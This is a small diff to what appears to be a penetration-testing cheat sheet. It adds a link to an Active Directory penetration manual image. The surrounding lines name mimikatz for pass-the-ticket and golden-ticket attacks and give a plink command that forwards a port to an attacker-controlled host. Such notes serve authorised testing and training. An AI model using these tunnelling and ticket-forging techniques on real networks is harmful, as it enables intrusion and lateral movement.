@@ -214,6 +214,8 @@ Pass the ticket: mimikatz
 
 Golden ticket: mimikatz
 
+https://tajdini.net/blog/wp-content/uploads/2021/09/Active-Directory-Penetration-Manual.png
+
 # Pivoting/Port Forwarding
 
 `cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N`
